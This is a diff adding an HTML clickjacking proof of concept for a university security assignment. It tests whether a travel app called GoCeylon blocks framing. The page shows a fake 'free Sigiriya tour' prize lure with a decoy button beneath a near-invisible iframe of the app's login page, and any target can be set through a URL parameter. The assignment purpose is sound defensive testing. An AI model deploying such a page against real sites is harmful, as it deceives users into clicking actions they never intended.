@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Win a Free Sri Lanka Tour!</title>
+    <!--
+        VULN-08 clickjacking proof of concept (SE4030 assignment, local testing only).
+
+        An attacker page loads GoCeylon inside an invisible iframe and places a decoy
+        button over a real button. The victim thinks they click "Claim", but the click
+        lands on GoCeylon.
+
+        Serve it from a different origin than the app, e.g.:
+            python -m http.server 8081 -d security-poc
+        then open http://localhost:8081/clickjacking.html
+        Optional: ?target=<url> to frame another page.
+
+        Before the fix: GoCeylon renders inside the frame.
+        After the fix:  the browser refuses to render it (X-Frame-Options / frame-ancestors).
+    -->
+    <style>
+        body { font-family: Arial, sans-serif; background: #fdf6e3; margin: 0; padding: 24px; }
+        h1 { color: #c0392b; margin: 0 0 8px; }
+        .stage { position: relative; width: 420px; height: 640px; margin-top: 16px; }
+        iframe { position: absolute; inset: 0; width: 100%; height: 100%; border: 0; z-index: 2; opacity: 0.0001; }
+        .decoy {
+            position: absolute; left: 50px; top: 466px; z-index: 1;
+            width: 400px; height: 60px; box-sizing: border-box; font-size: 18px; font-weight: bold;
+            color: #fff; background: #27ae60; border: 0; border-radius: 8px;
+        }
+        .controls { margin-top: 12px; padding: 10px; background: #fff; border: 1px dashed #999; width: 400px; }
+    </style>
+</head>
+<body>
+    <h1>Congratulations! You won a free tour of Sigiriya!</h1>
+    <p>Click the button below to claim your prize.</p>
+
+    <div class="stage">
+        <button class="decoy">CLAIM MY FREE TOUR</button>
+        <iframe id="victim" title="victim"></iframe>
+    </div>
+
+    <div class="controls">
+        <label>Demo: iframe opacity
+            <input id="opacity" type="range" min="0" max="100" value="0">
+            <span id="opacityValue">0%</span>
+        </label>
+        <p id="target"></p>
+    </div>
+
+    <script>
+        const target = new URLSearchParams(location.search).get('target') || 'http://localhost:5173/login';
+        const frame = document.getElementById('victim');
+        frame.src = target;
+        document.getElementById('target').textContent = 'Framed page: ' + target;
+
+        const slider = document.getElementById('opacity');
+        slider.addEventListener('input', () => {
+            frame.style.opacity = Math.max(slider.value / 100, 0.0001);
+            document.getElementById('opacityValue').textContent = slider.value + '%';
+        });
+    </script>
+</body>
+</html>
